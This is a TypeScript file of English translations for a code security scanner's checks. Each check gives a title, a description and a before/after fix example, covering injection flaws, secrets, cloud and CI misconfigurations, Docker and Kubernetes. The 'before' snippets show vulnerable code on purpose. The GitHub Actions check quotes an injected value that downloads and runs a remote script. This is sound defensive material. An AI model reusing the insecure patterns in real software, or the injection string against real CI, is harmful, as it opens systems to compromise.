import type { Lang } from "./translations.js";

// Traduzioni dei controlli a pattern. Il motore (src/checks/) resta l'unica
// fonte di verità per id, gravità e logica di rilevamento — qui traduciamo
// solo il testo pensato per chi legge, tenuto in un file separato così il
// motore condiviso (CLI, MCP, server) resta invariato e in italiano.
export interface CheckTranslation {
  title: string;
  description: string;
  fix: { before: string; after: string };
}

/**
 * I controlli a pattern (src/checks/) hanno un titolo e una descrizione
 * fissi per ogni checkId, qui traducibili con una semplice voce statica. I
 * controlli di Fase 2 (dipendenze, e in arrivo IaC/cloud config) generano
 * invece testo diverso ad ogni finding (nome pacchetto, versione, ID della
 * vulnerabilità...) — per questi la voce è una funzione che riceve il testo
 * italiano originale e ne deriva la versione nella lingua di destinazione,
 * invece di un oggetto fisso.
 */
type CheckTranslationEntry = CheckTranslation | ((original: CheckTranslation) => CheckTranslation);

type TranslatedCheckLang = Exclude<Lang, "it">;

/**
 * L'italiano è la lingua "nativa" del motore (src/checks/), quindi in
 * italiano restituiamo sempre il testo originale del Check/Finding così
 * com'è. Per ogni altra lingua: usiamo la sua tabella se esiste una voce per
 * quel checkId, altrimenti l'inglese come ripiego (più comprensibile a
 * livello globale dell'italiano), altrimenti l'italiano originale — così una
 * lingua ancora incompleta non mostra mai un testo mancante, solo l'inglese
 * finché non viene tradotta anche lei.
 */
export function translateCheckText<T extends { title: string; description: string; fix: { before: string; after: string } }>(
  checkId: string,
  original: T,
  lang: string
): { title: string; description: string; fix: { before: string; after: string } } {
  if (lang === "it") return original;
  const entry =
    checkTranslations[lang as TranslatedCheckLang]?.[checkId] ?? checkTranslations.en?.[checkId];
  if (!entry) return original;
  return typeof entry === "function" ? entry(original) : entry;
}

// Fase 2 — dependency scanning. Nome pacchetto, versione e ID della
// vulnerabilità (es. GHSA-...) sono lasciati invariati in ogni lingua: sono
// identificatori tecnici, non testo da tradurre. Lo stesso vale per il
// riassunto preso da OSV.dev nella description: i database di vulnerabilità
// pubblici (CVE, GHSA) sono nativamente in inglese anche quando il sito è in
// un'altra lingua — tradurlo rischierebbe di perdere precisione tecnica, per
// questo resta identico in tutte le lingue tranne il titolo e la nota finale.
const vulnerableDependencyEn: CheckTranslationEntry = (original) => ({
  title: original.title.replace("Dipendenza vulnerabile:", "Vulnerable dependency:"),
  description: original.description,
  fix: {
    before: original.fix.before,
    after: original.fix.after.replace(
      "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
      "No fixed version known yet — consider an alternative package or follow the project's updates."
    ),
  },
});

export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<string, CheckTranslationEntry>>> = {
  en: {
    "supabase-service-role-in-client": {
      title: "Supabase's secret key ends up in a browser-facing file",
      description:
        "A variable with a public prefix (e.g. NEXT_PUBLIC_, VITE_) or a client-side file references Supabase's service role key. This key bypasses Row Level Security: if it ends up in the browser bundle, anyone can read it and act as a database administrator.",
      fix: {
        before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
        after: `// app/api/admin/route.ts (server only)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
      },
    },
    "hardcoded-secret": {
      title: "Passwords or secret keys are written directly in the code",
      description:
        "An API key, token, or password appears to be written as a literal value instead of read from an environment variable. Anyone who reads the source code (or the repository, if public) gets that secret.",
      fix: {
        before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
        after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
      },
    },
    "env-file-with-real-values": {
      title: "A file with the project's real passwords is among those analyzed",
      description:
        "A .env file with real values (not a .env.example) is included in the analysis. If this file ends up in a repository or a public deploy, every credential it contains is exposed.",
      fix: {
        before: `# .env (committed by mistake)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
        after: `# .env.example (committed)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env stays out of the repo (.gitignore)`,
      },
    },
    "missing-row-level-security": {
      title: "Anyone can read or modify every user's data",
      description:
        "Row Level Security is disabled, or a policy allows access to anyone (USING (true)) without checking who's making the request. Every authenticated user — or even an anonymous one — can read or modify everyone else's data.",
      fix: {
        before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
        after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
      },
    },
    "sql-injection": {
      title: "A value entered by the user is pasted directly into a database query",
      description:
        "A SQL query is built by concatenating or interpolating a string directly instead of using parameters. If that text comes (even indirectly) from a user, it can alter the query itself — SQL injection.",
      fix: {
        before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
        after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
      },
    },
    "plaintext-password-storage": {
      title: "Passwords don't seem to be protected",
      description:
        "A password field is saved exactly as it arrived in the request, and no hashing function (bcrypt, argon2, scrypt) appears in the file. If the database is compromised, every password is immediately usable.",
      fix: {
        before: `await db.users.insert({ email, password: req.body.password })`,
        after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
      },
    },
    "hardcoded-jwt-secret": {
      title: "The secret used to sign logins is written in plain text in the code",
      description:
        "The secret passed to jwt.sign / jwt.verify (or the JWT_SECRET variable) is a literal value in the code instead of coming from an environment variable. Anyone who reads it can create valid access tokens for any user.",
      fix: {
        before: `jwt.sign(payload, "super-secret-key-123")`,
        after: `jwt.sign(payload, process.env.JWT_SECRET)`,
      },
    },
    "command-injection": {
      title: "The server can be forced to run external commands",
      description:
        "A function that runs system commands (exec, execSync, spawn) receives a string built by interpolation or concatenation. If part of that string comes from user input, whoever controls it can run arbitrary commands on the server.",
      fix: {
        before: "execSync(`convert ${filename} output.png`)",
        after: `execFile("convert", [filename, "output.png"])`,
      },
    },
    "unprotected-new-table": {
      title: "A new table appears to be created without protection",
      description:
        "A SQL migration creates a table but doesn't enable Row Level Security for that same table in the same file. As long as it stays this way, the table starts out with no restriction on who can read or write it.",
      fix: {
        before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
        after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
      },
    },
    "permissive-cors": {
      title: "The site accepts requests from any other website",
      description:
        "The CORS header is set to accept requests from any origin (*), or the cors() middleware is used without restrictions. Any third-party website can call your APIs from the browser of an already-authenticated user.",
      fix: {
        before: `app.use(cors())`,
        after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
      },
    },
    "admin-function-missing-auth": {
      title: "A function with admin permissions doesn't check who's using it",
      description:
        "A route or function whose name suggests admin operations doesn't contain, in the nearby lines, any authentication or role check. Anyone who knows the URL could run it.",
      fix: {
        before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
        after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      },
    },
    ssrf: {
      title: "The site can be forced to run external code",
      description:
        "An outgoing HTTP request (fetch, axios) directly uses a value coming from a user's request as the destination URL. A malicious user can make your server call internal or arbitrary addresses — Server-Side Request Forgery.",
      fix: {
        before: `const data = await fetch(req.query.url)`,
        after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
      },
    },
    "weak-password-hashing": {
      title: "Passwords are protected with a method that's now easy to break",
      description:
        "On the same line, md5() or sha1() are applied to a value tied to a password. These algorithms are too fast to compute: an attacker with the database can try billions of passwords per second.",
      fix: {
        before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
        after: `const hashed = await bcrypt.hash(password, 12)`,
      },
    },
    "xss-dangerous-html": {
      title: "Text written by users could run code in the browser",
      description:
        "Content is inserted into the page as raw HTML (dangerouslySetInnerHTML, v-html, .innerHTML) instead of as plain text. If that content includes user input, it can contain scripts that run in the browser of whoever reads the page.",
      fix: {
        before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
        after: `<div>{comment.text}</div>\n// or, if HTML is needed: DOMPurify.sanitize(comment.text)`,
      },
    },
    "public-storage-bucket": {
      title: "The space for uploaded files is visible to anyone",
      description:
        "A storage bucket (Supabase Storage, S3) is configured as public. If it contains documents, photos, or files uploaded by users, anyone who knows — or guesses — the path can access them without authentication.",
      fix: {
        before: `supabase.storage.createBucket("uploads", { public: true })`,
        after: `supabase.storage.createBucket("uploads", { public: false })\n// serve files with time-limited signed URLs: createSignedUrl(path, 60)`,
      },
    },
    "csrf-state-changing-get": {
      title: "A single link is enough to delete or change data",
      description:
        "A GET route performs an operation that changes data (the path contains delete/remove/update/edit). GET requests run just by visiting a link or loading an image from an external site — the classic stepping stone for a CSRF attack.",
      fix: {
        before: `router.get("/posts/:id/delete", deletePost)`,
        after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
      },
    },
    "insecure-token-storage": {
      title: "Login data saved in the browser isn't well protected",
      description:
        "An access token is saved in localStorage. Unlike an httpOnly cookie, any script running on the page (including a malicious one injected via XSS) can read and steal it.",
      fix: {
        before: `localStorage.setItem("authToken", token)`,
        after: `// set the token as an httpOnly cookie from the server:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "open-redirect": {
      title: "The site can be used to redirect to a scam website",
      description:
        "The site redirects the user to an address taken directly from the request (query, body, params) without checking that it's a known domain. A link that looks like it points to your site can actually lead to a phishing page.",
      fix: {
        before: `res.redirect(req.query.next)`,
        after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
      },
    },
    idor: {
      title: "Changing a number in the address could show someone else's data",
      description:
        "A database query directly uses an identifier taken from the URL (req.params.id) without checking, in the nearby lines, that it belongs to the user making the request. Changing the id in the address could give access to another user's data — Insecure Direct Object Reference.",
      fix: {
        before: `const order = await Order.findById(req.params.id)`,
        after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
      },
    },
    "no-login-rate-limit": {
      title: "The login form doesn't block too many attempts in a row",
      description:
        "A login route is defined in the file, but there's no trace of rate-limiting middleware in the same file. Without a limit on attempts, an attacker can try passwords in sequence (brute force) without being slowed down.",
      fix: {
        before: `router.post("/login", loginHandler)`,
        after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
      },
    },
    "sensitive-data-in-logs": {
      title: "Passwords or sensitive data end up in logs",
      description:
        "A call to console.log (or similar) includes a variable called password, token, secret, or apiKey. If these logs end up in an external service or a file, sensitive data stays exposed for much longer than necessary.",
      fix: {
        before: `console.log("login attempt", { email, password })`,
        after: `console.log("login attempt", { email })`,
      },
    },
    "path-traversal": {
      title: "A file on the server can be read or written by choosing the path from outside",
      description:
        "A function that reads, writes, or sends a file gets the path directly from a request value (query, body, params) without checking that it stays inside an allowed folder. An attacker can insert \"../\" to escape the intended folder and read or overwrite arbitrary files on the server (e.g. a configuration file with credentials).",
      fix: {
        before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
        after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Path not allowed")\n  res.sendFile(target)\n})`,
      },
    },
    "nosql-injection": {
      title: "A value entered by the user is executed as code inside a MongoDB query",
      description:
        "MongoDB's $where operator runs server-side JavaScript for every document — if that string is built by concatenating a value that comes from the user, whoever controls it can make arbitrary code run in the database's context, not just alter the filter like with a normal SQL injection.",
      fix: {
        before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
        after: `db.collection.find({ username: username })`,
      },
    },
    ssti: {
      title: "A value entered by the user is interpreted as a template, not as data",
      description:
        "A function that compiles/renders a template receives the ENTIRE template from a request value, instead of using a fixed template and passing only the data. An attacker can write directly in the template engine's syntax (e.g. {{7*7}} for Jinja2) and run code on the server — Server-Side Template Injection, which often leads to arbitrary command execution, not just a display issue like XSS.",
      fix: {
        before: `return render_template_string(request.args.get("name"))`,
        after: `return render_template("profile.html", name=request.args.get("name"))`,
      },
    },
    xxe: {
      title: "The XML parser can be forced to read files or make external requests",
      description:
        "An XML parser (DocumentBuilderFactory) is created without explicitly disabling external entities (DOCTYPE) in the nearby lines. If the parser receives XML from an untrusted source, an attacker can define an external entity to read files on the server or make it contact an address of their choice — XML External Entity.",
      fix: {
        before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
        after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      },
    },
    "terraform-open-security-group": {
      title: "A Terraform security group opens a sensitive port to the whole internet",
      description:
        "A rule with \"cidr_blocks\" that includes 0.0.0.0/0 (any IP address) is near a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
        after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "gcp-firewall-open-to-internet": {
      title: "A Google Cloud firewall rule opens a sensitive port to the whole internet",
      description:
        "A \"google_compute_firewall\" resource with \"source_ranges\" that includes 0.0.0.0/0 (any IP address) allows traffic to a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
        after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "azure-nsg-open-to-internet": {
      title: "An Azure network rule opens a sensitive port to the whole internet",
      description:
        "A network security rule (\"azurerm_network_security_rule\", or a \"security_rule\" block inside \"azurerm_network_security_group\") with \"source_address_prefix\" set to \"*\" or \"0.0.0.0/0\", direction \"Inbound\" and access \"Allow\", near a sensitive port — SSH (22), RDP (3389), or a typical database port. Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
        after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # only your private network, or a bastion host\n}`,
      },
    },
    "terraform-hardcoded-secret": {
      title: "A secret is written as the default value of a Terraform variable",
      description:
        "A variable with a name like password/secret/token/key has a literal value in its \"default\". Unlike a value passed at runtime (tfvars, TF_VAR_* environment variables), a default ends up in the source code — and if the repository is shared or public, anyone can see it, even without access to the Terraform state.",
      fix: {
        before: `variable "db_password" {\n  default = "supersecret123"\n}`,
        after: `variable "db_password" {\n  # no default: pass it with a .tfvars file (outside git) or a TF_VAR_db_password environment variable\n  sensitive = true\n}`,
      },
    },
    "gha-script-injection": {
      title: "A value controlled by an external user goes directly into a CI shell command",
      description:
        'A "run:" command in a GitHub Actions workflow directly interpolates a value like a pull request title, a branch name, or a comment\'s text — all writable by anyone who opens a pull request or comment, even from an external fork. A value like `"; curl malware.sh | sh #` would run arbitrary commands in the CI, with access to every secret available in that workflow.',
      fix: {
        before: `- run: echo "\${{ github.event.pull_request.title }}"`,
        after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passed as an environment variable, never interpolated directly into the command`,
      },
    },
    "gha-pull-request-target-checkout": {
      title: "The workflow runs an external pull request's code with access to the repository's secrets",
      description:
        'The workflow uses "pull_request_target" — which runs with the base repository\'s permissions and secrets even for a pull request opened from an unrelated fork — and checks out the pull request\'s own code ("github.event.pull_request.head"), not the base branch. Whoever opens the pull request effectively gets their own code to run with access to those secrets.',
      fix: {
        before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
        after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checks out the base branch, not the PR's code — or use\n      # "pull_request" instead of "pull_request_target" if you don't need\n      # the broader permissions/secrets.\n      - uses: actions/checkout@v4`,
      },
    },
    "insecure-deserialization": {
      title: "Request data is deserialized with a format that can execute code",
      description:
        "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), or the node-serialize library (Node) are deserializing a value taken directly from the request. Unlike JSON, these formats can represent and execute code during deserialization itself — whoever controls the value sent can achieve arbitrary code execution on the server.",
      fix: {
        before: `data = pickle.loads(request.data)`,
        after: `import json\ndata = json.loads(request.data)  # JSON never executes code while parsing, unlike pickle`,
      },
    },
    "jwt-none-algorithm": {
      title: 'The code explicitly accepts unsigned JWT tokens ("none" algorithm)',
      description:
        '"none" appears among the algorithms accepted to verify a JWT token. A token with the "none" algorithm has no signature to verify: anyone can build one with any content (e.g. an admin role) and the code would accept it as valid.',
      fix: {
        before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
        after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // never include "none" among the accepted algorithms`,
      },
    },
    "terraform-s3-block-public-access-disabled": {
      title: "Block Public Access is disabled on an S3 bucket defined in Terraform",
      description:
        'One or more of the four protections in "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) are set to false. It doesn\'t mean the bucket is already public, but it removes a safety net that would prevent it from being made public by mistake in the future.',
      fix: {
        before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
        after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
      },
    },
    "terraform-iam-wildcard-policy": {
      title: "An IAM policy defined in Terraform grants full access",
      description:
        'A statement with action "*" and resource "*" grants full access to every AWS service and resource — the same check already done on the live IAM state, here read directly from the code before it\'s even applied. It might be intended for an emergency role, but it should be confirmed: for everyday use, grant only the permissions that are actually needed.',
      fix: {
        before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
        after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
      },
    },
    "gcp-storage-bucket-public": {
      title: "A Google Cloud Storage bucket is made readable by anyone",
      description:
        'A "google_storage_bucket_iam_member" or "google_storage_bucket_iam_binding" resource grants a role to "allUsers" or "allAuthenticatedUsers" — the first makes the bucket readable by anyone on the internet, even without a Google account; the second by anyone with any Google account, not just who should have access.',
      fix: {
        before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
        after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # only whoever should actually have access, not allUsers/allAuthenticatedUsers\n}`,
      },
    },
    "azure-storage-public-access": {
      title: "Public blob access is enabled on an Azure storage account",
      description:
        '"allow_blob_public_access" is set to true on an "azurerm_storage_account": anyone who knows the URL of a blob/container made public can read it, without any authentication.',
      fix: {
        before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
        after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
      },
    },
    "gcp-iam-overly-broad-role": {
      title: "A Google Cloud IAM role grants full access (Owner/Editor)",
      description:
        'A "google_project_iam_binding"/"google_project_iam_member" (or the equivalent at organization/folder level) assigns the primitive role "roles/owner" or "roles/editor" — near-complete access to every service in the project. It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific predefined roles that are actually needed.',
      fix: {
        before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
        after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # only the predefined role that's actually needed, not roles/owner\n  member  = "user:dev@example.com"\n}`,
      },
    },
    "azure-role-assignment-owner": {
      title: "An Azure role assignment grants full access (Owner)",
      description:
        'An "azurerm_role_assignment" assigns the "Owner" role — full access, including control over other users\' permissions, over the entire assigned scope (subscription, resource group...). It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific role that\'s actually needed (e.g. "Contributor" on a single resource group).',
      fix: {
        before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
        after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # only the more specific role that's actually needed, not Owner on the whole subscription\n}`,
      },
    },
    "weak-random-token": {
      title: "A security token is generated with a random number generator that isn't cryptographically secure",
      description:
        "A value with a name like token/session/reset/otp/csrf is generated with Math.random() (JS), random.random() (Python), or rand() (PHP) — generators not designed for security, whose sequences are predictable. A token generated this way can be guessed or reconstructed, defeating the purpose it exists for (e.g. a password reset link that anyone could predict).",
      fix: {
        before: `const resetToken = Math.random().toString(36).slice(2);`,
        after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, not Math.random — unpredictable`,
      },
    },
    "ldap-injection": {
      title: "An LDAP filter is built by directly concatenating a request value",
      description:
        'A line that builds an LDAP filter (e.g. "(uid=...)") directly includes a value taken from the request, without any escaping of LDAP special characters. Whoever controls that value can alter the filter\'s logic — for example bypassing an authentication check or reading directory data they shouldn\'t see.',
      fix: {
        before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
        after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP special characters must always be escaped before using them in a filter\nclient.search(base, { filter });`,
      },
    },
    "header-injection": {
      title: "A request value ends up directly in an HTTP response header",
      description:
        "An HTTP response header is set with a value taken directly from the request (query, body, params), without checking that it doesn't contain a line break (CRLF). An attacker can insert additional headers or even an entirely different response — response splitting — potentially manipulating caching, cookies, or the content shown to other users.",
      fix: {
        before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
        after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
      },
    },
    "gha-unpinned-action": {
      title: "A third-party CI action isn't pinned to a precise version (commit SHA)",
      description:
        'The workflow uses a third-party action referenced by tag or branch (e.g. "@v1", "@main") instead of by commit SHA. Whoever maintains it — or whoever compromises their account — can move that reference to a different commit at any time, silently changing what runs in the CI, with access to its secrets. A commit SHA always points to the exact same code.',
      fix: {
        before: `uses: some-org/some-action@v1`,
        after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, pinned to the commit SHA — update the SHA when you update the version`,
      },
    },
    "gha-excessive-permissions": {
      title: "The workflow grants itself every token permission instead of only the ones it uses",
      description:
        '"permissions: write-all" grants the workflow\'s GITHUB_TOKEN write access to everything — issues, pull requests, packages, deployments — even if the workflow only uses some of it. If a step in the workflow is compromised (a malicious dependency, an injected script), those broader permissions increase what whoever exploits it can do.',
      fix: {
        before: `permissions: write-all`,
        after: `permissions:\n  contents: read\n  pull-requests: write  # only the permissions the workflow actually uses`,
      },
    },
    "insecure-cookie-flags": {
      title: "A session or authentication cookie is set without the Secure and HttpOnly flags",
      description:
        'A cookie with a name resembling session/auth/token is set without "httpOnly" and "secure" among its options. Without httpOnly, JavaScript on the page — including code injected via XSS — can read that cookie. Without secure, it can also be sent over an unencrypted HTTP connection.',
      fix: {
        before: `res.cookie("session", sessionId)`,
        after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "vulnerable-dependency": vulnerableDependencyEn,
    "docker-hardcoded-secret": {
      title: "A secret is written directly in an ENV or ARG instruction in the Dockerfile",
      description:
        "A variable with a name like password/secret/token/key has a literal value in an ENV or ARG instruction. Unlike a .env file (which normally doesn't end up in the image), this value gets baked into the Docker image itself — anyone who can pull it or inspect the layer history can recover it, even if the line is removed in a later version of the Dockerfile.",
      fix: {
        before: `ENV DB_PASSWORD=supersecret123`,
        after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passed with: docker build --build-arg DB_PASSWORD=*** (or, better yet,\n# a BuildKit secret mount, which never ends up in the layer history)`,
      },
    },
    "docker-missing-user": {
      title: "The Dockerfile doesn't set a non-root user",
      description:
        "No USER instruction in the Dockerfile: without one, the container runs as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact on the surrounding system — easier.",
      fix: {
        before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
        after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
      },
    },
    "docker-unpinned-base-image": {
      title: 'The Dockerfile\'s base image uses the ":latest" tag',
      description:
        'A FROM instruction explicitly uses the ":latest" tag instead of a precise version. "latest" changes over time: the same build, redone at a different moment, can get a different version of the base image — a non-reproducible build, and an unwanted update can arrive without anyone having decided it should.',
      fix: {
        before: `FROM node:latest`,
        after: `FROM node:20.11-slim`,
      },
    },
    "docker-add-remote-url": {
      title: "The Dockerfile downloads a remote file with ADD instead of COPY",
      description:
        "An ADD instruction with an http/https URL downloads a file from the internet during the build, with no integrity check and with the content invisible in the repository. If that URL is ever compromised, the build pulls in arbitrary content without anyone noticing just by reading the Dockerfile.",
      fix: {
        before: `ADD https://example.com/install.sh /tmp/install.sh`,
        after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
      },
    },
    "k8s-privileged-container": {
      title: "A container in the Kubernetes manifest runs as privileged",
      description:
        '"privileged: true" in a container\'s securityContext disables almost all the usual isolation between container and host: the container can access the host\'s devices, change its network configuration, and in many cases effectively gain root access to the machine running it. Almost never needed for a normal app.',
      fix: {
        before: `securityContext:\n  privileged: true`,
        after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # only the capabilities actually needed`,
      },
    },
    "k8s-plaintext-secret-env": {
      title: "A secret is written in plain text in a Kubernetes manifest's env variable",
      description:
        'An environment variable with a name like password/secret/token/key has a literal value ("value:") instead of being read from a Secret ("valueFrom.secretKeyRef"). The manifest itself — often committed to a repository — therefore contains the secret in plain text, visible even to someone who can only read the configuration, not necessarily run commands in the cluster.',
      fix: {
        before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
        after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
      },
    },
    "k8s-run-as-root": {
      title: "A container in the Kubernetes manifest is set to run as root",
      description:
        '"runAsUser: 0" or "runAsNonRoot: false" in the securityContext explicitly force the container to run as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact — easier.',
      fix: {
        before: `securityContext:\n  runAsUser: 0`,
        after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
      },
    },
    "k8s-privilege-escalation": {
      title: "A container in the Kubernetes manifest can gain more privileges than it started with",
      description:
        '"allowPrivilegeEscalation: true" in the securityContext lets a process inside the container gain more privileges than the process that started it (e.g. through a setuid binary). Combined with a vulnerability in the application, it\'s one more step toward running code with more privileges than intended.',
      fix: {
        before: `securityContext:\n  allowPrivilegeEscalation: true`,
        after: `securityContext:\n  allowPrivilegeEscalation: false`,
      },
    },
    "k8s-host-namespace-access": {
      title: "A pod in the Kubernetes manifest shares the host's network, processes, or shared memory",
      description:
        '"hostNetwork", "hostPID" or "hostIPC" set to true take the pod out of its normal isolation: hostNetwork exposes the pod on the host\'s network (bypassing the cluster\'s network policies), hostPID gives it visibility into every process on the host machine, hostIPC gives it access to the host\'s shared memory. Almost never needed for a normal app — typically only for low-level system/monitoring tools.',
      fix: {
        before: `spec:\n  hostNetwork: true`,
        after: `spec:\n  hostNetwork: false`,
      },
    },
    "k8s-missing-run-as-non-root": {
      title: "The Kubernetes manifest doesn't explicitly enforce running as a non-root user",
      description:
        'No "runAsNonRoot" anywhere in the manifest (neither at pod nor at container level): without setting it, a container runs as whatever user its image defines — often root by default, if the image itself hasn\'t changed that. Setting it explicitly to true makes the pod fail to start if the image still tries to run as root, instead of only finding out after an incident.',
      fix: {
        before: `containers:\n  - name: app\n    image: myapp:1.0`,
        after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
      },
    },
  },
};
